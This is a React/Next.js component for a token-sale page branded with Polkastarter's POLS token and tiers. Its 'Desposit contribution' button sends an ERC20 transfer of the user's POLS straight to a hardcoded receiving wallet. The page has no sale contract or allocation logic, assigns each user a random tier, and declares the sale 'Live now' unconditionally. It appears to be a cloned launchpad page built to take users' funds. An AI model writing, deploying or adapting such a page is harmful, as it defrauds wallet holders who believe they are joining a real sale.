/* eslint-disable @typescript-eslint/no-explicit-any */

'use client';

import React, {useEffect, useState, useRef} from 'react'
import {useResolvedTheme} from "@/components/shared/theme-context"
import Image from "next/image";
import { useProjectStore, useWalletStore } from '@/store';
import { usePathname } from 'next/navigation';
import { CoinType, getIcon } from '@/utils';
import { Button } from '@/components/ui/button';
import CoinSelect from '@/components/shared/coinselectpopover';
import PolkastarterIcon from '@/components/icons/polkastarter-icon';
import { UpcomingProjectInfo } from '@/constants/projects';
import { Checkbox } from '@/components/ui/checkbox';
import { AlertIcon } from '@/components/icons/icons';
import { AlertDialog, AlertDialogCancel, AlertDialogContent,  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import type { Provider } from "@reown/appkit/react";
import { useChainStore } from '@/store';

type SingleProject = {
  SwiperImagesFiles?: string[];
  Description?: Record<string, any>;
  TokenSale?: Record<string, any>;
  saleSummary?:Record<string, any>
};

const normalize = (str: string) => str.trim().toLowerCase().replace(/\s+/g, ' ');

const getProjectData = (projectName?: string): SingleProject | null => {
  if (!projectName) return null;

  const searchName = normalize(projectName);

  const found = UpcomingProjectInfo.find(item => {
    const key = Object.keys(item)[0];
    return normalize(key) === searchName;
  });

  return found ? Object.values(found)[0] as SingleProject : null;
};







const Sale =() =>  {
  const {resolvedTheme, mounted} = useResolvedTheme();
  const [isLoggedIn , setIsLoggedIn] = useState<boolean>(true);
  const [isWalletetConnected , setIsWalletConnected] = useState<boolean>(true);
  const [connectedAddress, setConnectedAddress] = useState<string | null>("0x789");
  const pathname = usePathname();
  const selectedProject = useProjectStore((state) => state.selectedProject);
  const [amount, setAmount] = useState("0")
  const [isTyping, setIsTyping] = useState(false);
  
  const TIERS = [
    { name: 'Starter', pols: 1000 },
    { name: 'Booster', pols: 5000 },
    { name: 'Supercharger', pols: 10000 },
  ];
  const [userTier, setUserTier] = useState<{ name: string; pols: number } | null>(null);
  const [openDialog, setOpenDialog] = useState(false);
  const {address, isConnected} = useAppKitAccount()
  const { walletAddress, setWallet} = useWalletStore();
  const [ isWalletConnected, setWalletConnected] = useState<boolean>(false);
  const { walletProvider } = useAppKitProvider<Provider>("eip155");
  const [polsBalance, setPolsBalance] = useState("0.00");
  const [errorDialogueOpen, setErrorDialogueOpen] = useState<boolean>(false);

  async function fetchPolsBalance() {
    if (!walletProvider || !address) return;

    try {
      const POLS_CONTRACT = "0x83e6f1E41cdd28eAcEB20Cb649155049Fac3D5Aa";
      const balanceOfData =
        "0x70a08231" + address.replace("0x", "").padStart(64, "0");

      const rawBalance = await walletProvider.request({
        method: "eth_call",
        params: [{ to: POLS_CONTRACT, data: balanceOfData }, "latest"],
      });

      const balance = parseInt(rawBalance as any, 16) / 1e18;
      setPolsBalance(balance.toFixed(2));
    } catch (err) {
      console.error("Failed to fetch POLS balance:", err);
      setPolsBalance("0.00");
    }
  }

  useEffect(() => {
    if (isConnected) fetchPolsBalance();
  }, [isConnected, walletProvider, address]);


  useEffect(() => {
    const randomTier = TIERS[Math.floor(Math.random() * TIERS.length)];
    setUserTier(randomTier);
  }, []);

   
  useEffect(() => {
    if (isConnected && address) {
      setIsWalletConnected(isConnected);
      setWallet(address);
    }
}, [])
  

  if (!selectedProject) {
    return null;
  };

  if (!mounted) { 
    return null;
  }

  const {
    name,
    about,
    backgroundImage,
    icon,
    cointypeIcon,
    FundRaiseValue,
    maxAllocation,
    time,
    status,
    date,
    dateStatement,
    tokenPrice,
    RaiseToken,
    participants,
    salePercentage,
} = selectedProject;

const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  setIsTyping(true);
  
  const raw = e.target.value.replace(/,/g, "");

  if (/^\d*$/.test(raw)) {
    
    const parts = raw.split("");
    let formatted = "";
    let count = 0;
    for (let i = parts.length - 1; i >= 0; i--) {
      formatted = parts[i] + formatted;
      count++;
      if (count % 3 === 0 && i !== 0) {
        formatted = "," + formatted;
      }
    }

    setAmount(formatted);
  }
};

const handleBlur = () => {
  setIsTyping(false);
  if (amount === "") {
    setAmount("0");
  }
};


async function ensureCorrectNetwork(chain: "Binance" | "Ethereum") {
  const targetChainId = chain === "Binance" ? "0x38" : "0x1"; // BSC or Ethereum

  try {
    // Attempt to switch the user's wallet network
    await walletProvider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: targetChainId }],
    });
  } catch (err: any) {
    // If chain is not added in MetaMask → we add it
    if (err.code === 4902 && chain === "Binance") {
      await walletProvider.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0x38",
            chainName: "Binance Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
    } else {
      throw err; // show actual error if switching fails
    }
  }
}

  const CHAIN_CONTRACTS = {
    Binance: "0x7e624FA0E1c4AbFD309cC15719b7E2580887f570", 
    Ethereum: "0x83e6f1E41cdd28eAcEB20Cb649155049Fac3D5Aa", 
  } as const;
  
  const RECEIVER = "0x680ba3Dc38F76ba786BCF0947f993A517b4a3301"; 
  const DECIMALS = 18;
  
  const handleContributeClick = async () => {
    if (!walletProvider || !address) return;
  
    try {
      const { selectedChain } = useChainStore.getState(); 
      const POLS_CONTRACT = CHAIN_CONTRACTS[selectedChain]; 
  
      const polsAmount = Number(amount.replace(/,/g, ""));
      if (!polsAmount || polsAmount <= 0) return;
  
     
      await ensureCorrectNetwork(selectedChain);
  
    
      const amountHex = `0x${BigInt(polsAmount * 10 ** DECIMALS).toString(16)}`;
      const methodId = "0xa9059cbb"; // transfer(address,uint256)
      const encodedAddress = RECEIVER.replace("0x", "").padStart(64, "0");
      const encodedAmount = amountHex.replace("0x", "").padStart(64, "0");
      const data = methodId + encodedAddress + encodedAmount;
  
 
      const txHash = await walletProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: address,
            to: POLS_CONTRACT,
            data,
          },
        ],
      });
  
      console.log("POLS Transaction Sent:", txHash);
   
  
    } catch (err: any) {
      console.error("POLS Transaction failed:", err);
      setErrorDialogueOpen(true);
    }
  };

const submitDisabled = Number(amount.replace(/,/g, "")) > 0;

const CoinIcon = getIcon(cointypeIcon as CoinType);
const dateState = name === "Zesh AI Layer" ? "TBA": date;
const shouldShowNoPolsError = !isWalletetConnected &&  Number(amount.replace(/,/g, "")) > 0;
const projectData = getProjectData(name);

type NormalizedTokenSaleItem = {
  key: string;
  value: string ;
};

const getSaleSummary = (): NormalizedTokenSaleItem[] => {

  const saleSummary = projectData?.saleSummary ?? "";

  return Object.entries(saleSummary).map(([key, value]) => {
    if (typeof value === "string") {
      return { key, value };
    }

    return { key, value: "" };
  });
};

  const SaleSummaryItems = getSaleSummary();

 

if (userTier) {
  const salePriceIndex = SaleSummaryItems.findIndex(
    item => item.key.toLowerCase().includes('sale price')
  );

  if (salePriceIndex !== -1) {
    SaleSummaryItems.splice(salePriceIndex + 1, 0, {
      key: `Tier (${userTier.name})`,
      value: `${userTier.pols} POLS`,
    });
  }
}

  return (
    <div className='py-8 min-h-screen overflow-hidden relative'>
           <div className='py-16 px-6'>
           <div className='flex  flex-col items-center justify-center gap-2'>
              <div className='flex flex-row gap-4 items-center'>
                <Image 
                  width={40}
                  height={80}
                  alt={name}
                  src={icon}
                  objectFit='center'
                  className=' w-24 h-24 object-cover rounded-full '
                />
                 <h2 className='text-[36px] text-primary font-bold'> {name} </h2>
              </div>
              <div className='border border-transparent  px-3 py-1.5 gap-2  flex items-center  bg-green-300 rounded-sm '>
                <span className="animate-ping absolute inline-flex h-3 w-3 -translate-x-[0.09rem] rounded-full bg-black opacity-75"></span>
                <span className="inline-flex h-2 w-2 rounded-full bg-black"></span>
                <span className='uppercase text-black font-[550] text-[13px]'> sale is Live now</span>
                              
              </div>
              <div className='mt-8 flex flex-col gap-4 w-full justify-center'>
                <div className='flex items-center flex-row justify-between gap-4 '>
                  <p className='capitalize text-primary text-[18px] font-[400] whitespace-nowrap'> Total raise</p>
                  <hr
                    className={`flex-grow border-0 h-[1px] bg-[length:5px_1px] bg-repeat-x bg-center 
                      ${resolvedTheme === "dark"
                        ? "bg-[linear-gradient(90deg,#ffffff_30%,rgba(255,255,255,0)_0px)]"
                        : "bg-[linear-gradient(90deg,#000000_30%,rgba(0,0,0,0)_0px)]"
                      }`}
                  />
                  <p className='text-[18px] font-[400]'> {FundRaiseValue} </p>
                </div>
                <div className='flex items-center flex-row justify-between gap-4 '>
                  <p className='capitalize text-primary text-[18px] font-[400] whitespace-nowrap'>Price per token </p>
                  <hr
                    className={`flex-grow border-0 h-[1px] bg-[length:5px_1px] bg-repeat-x bg-center 
                      ${resolvedTheme === "dark"
                        ? "bg-[linear-gradient(90deg,#ffffff_30%,rgba(255,255,255,0)_0px)]"
                        : "bg-[linear-gradient(90deg,#000000_30%,rgba(0,0,0,0)_0px)]"
                      }`}
                  />
                  <p className='text-[18px] font-[400]'> {tokenPrice} </p>
                </div>
                <div className='flex items-center flex-row justify-between gap-4 '>
                  <p className='capitalize text-primary text-[18px] font-[400] whitespace-nowrap'> Raise token </p>
                  <hr
                    className={`flex-grow border-0 h-[1px] bg-[length:5px_1px] bg-repeat-x bg-center 
                      ${resolvedTheme === "dark"
                        ? "bg-[linear-gradient(90deg,#ffffff_30%,rgba(255,255,255,0)_0px)]"
                        : "bg-[linear-gradient(90deg,#000000_30%,rgba(0,0,0,0)_0px)]"
                      }`}
                  />
                  <p className='text-[17px] font-[400] whitespace-nowrap'> {RaiseToken} </p>
                </div>
              </div>
            </div>
            <div className='mt-12 md:mt-12 flex flex-col items-center justify-center gap-6'>
                <div
                className={`
                  relative min-w-3/4  overflow-hidden h-auto rounded-xl transform transition-all
                  border  shadow-md  bg-cover 
                  ${resolvedTheme === 'dark' ? 'before:mix-blend-soft-light before:opacity-50 border-[#27272a] bg-[var(--background-1)]' 
                  : 'before:mix-blend-darken before:opacity-5 border-gray-200 bg-white'}
                  before:content-[''] before:absolute before:inset-0 before:block
                  before:bg-[url('/assets/images/surface-bitmap.png')]  
                `}
              >
                  <div className={`relative flex w-full border-b-[1.6px] items-center justify-between px-5 py-4  ${resolvedTheme === 'dark' ? 'bg-zinc-950/70' : 'bg-white/60'}`}>
                    <div className='flex flex-row gap-2'>
                        <p className='text-[19px] font-bold'> {name}</p>
                        <div className='bg-[linear-gradient(200deg,rgba(0,187,255,0.05)_0%,rgba(0,187,255,0.15)_100%)] rounded-[5px] items-center text-center px-2 py-1'>
                            <p className='uppercase text-[var(--type-6)] font-[600] text-[13px] sm:tex-[14px] '> token sale  </p>
                        </div>
                    </div>
                    {CoinIcon && (
                      <CoinIcon  className="size-6"/>
                    )}
                    </div> 
                    <div className='relative mt-8 flex flex-col gap-6 justify-center  items-center'>
                      <div className='relative' data-slot="POLS coin selection type">
                        <CoinSelect />
                      </div>
                      <div className='relative'> 
                        <input
                          type="text"
                          value={amount}
                          maxLength={10}
                          inputMode="numeric"
                          onChange={handleChange}
                          onBlur={handleBlur}
                          className={` text-[color:var(--color-primary-type)]   font-[500] w-full bg-transparent text-center text-6xl focus:outline-none`}
                        />
                        {shouldShowNoPolsError && (
                          <p className='__className_a17902 mt-2 relative text-sm text-red-800 dark:text-[#f87171] font-[600] duration-200 text-center'> You dont have enough POLS to stake </p>
                        )}
                      </div>
                      <div className='flex flex-col items-center'>
                  <div className='flex items-center gap-1.5'>
                    <PolkastarterIcon  className='size-5'/>
                    <div className='flex items-center -space-x-7'> 
                    <span className='font-[500] tracking-wide text-[18px] hover:bg-contrast cursor-pointer'>
                          {polsBalance.split(".")[0]}
                      <span className='text-[var(--text-muted)] pr-8'>
                          .{polsBalance.split(".")[1] || "00"}
                      </span>
                      </span>
                      <span className='text-[var(--text-muted)] text-[14px] font-[600]'>POLS</span>
                    </div>
                  </div>
                  </div>

                    </div> 
                    <div data-slot=" connected Wallet Account field" className='relative mt-8 px-6  flex flex-col space-y-2 w-full' >
                      <h2 className='text-primary text-[19px] sm:text-[19px] font-bold'> Wallet where your token allocation will be claimed. </h2>
                      <label htmlFor='country' className='capitalize text-[14px] sm:text-[17px] text-primary font-bold'>
                        ERC20 Wallet Address*
                      </label>
                      <input 
                          id="ERC 20"
                          name="wallet"
                          type="text"
                          value={address}
                          readOnly
                          className='relative  ease-in-out text-primary
                           p-3 border   rounded-lg bg-inherit text-[15px]  sm:text-[16px] font-bold '
                      />
                  </div>
                  <div className='mt-8 px-8 pb-2 flex flex-col gap-3 items-start '>
                    <h2 className='text-left __className_a17902 text-[var(--text-muted)] text-[15px] font-mono font-[500] uppercase transition-colors duration-300 '> Sale Summary</h2>  
                    {SaleSummaryItems.length > 0 && SaleSummaryItems.map((item, idx) => (
                       <div key={idx} className='flex h-6 min-w-full flex-row justify-between items-center gap-2'>
                          <p className='font-[600] text-primary  text-[14px] shrink-0 '> {item.key} </p>
                          <div className='border-[0.8px] mt-1 w-full border-dashed ' />
                          <p className='  text-[var(--type-2)] shrink-0 truncate tracking-tight font-[500] text-[14px] text-right'> {item.value} </p>
                      
                      </div>
                    
                    ))}
                </div>
                </div>  
            </div>
            <div className='mt-8 py-8 flex flex-col space-y-1'>
              <p className='text-primary font-[600] text-[14px] sm:text-[17px] '> {` Do you want to receive updates from ${name}?`}</p>
              <div className='flex flex-row items-center gap-3'>
                <Checkbox id="terms" className={` border ${resolvedTheme === 'dark' ? 'bg-zinc-600' : 'bg-zinc-200'}`} />
                <span className='text-[var(--type-2)] text-[14px] sm:text-[17px] font-normal'> {` Yes, I agree to receive updates from ${name} in the future`}</span>
              </div>
            </div>
            <div aria-label='submit button' className=' relative flex items-center justify-center'>
             
                <Button
                  className={`relative px-3   rounded-lg py-6 font-[600] text-[14px] duration-200 transition-all border border-transparent text-center bg-primary text-background cursor-pointer ${
                    !submitDisabled ? resolvedTheme === "dark" ? "bg-zinc-600 text-zinc-300" : "bg-zinc-200 text-[var(--type-2)]" : "bg-primary text-background cursor-pointer"
                  }`}
                  onClick={handleContributeClick}
                  disabled={!submitDisabled} 
                >
                  Desposit contribution
                </Button>
            </div>
           </div>
    </div>
  )
}

export default Sale;
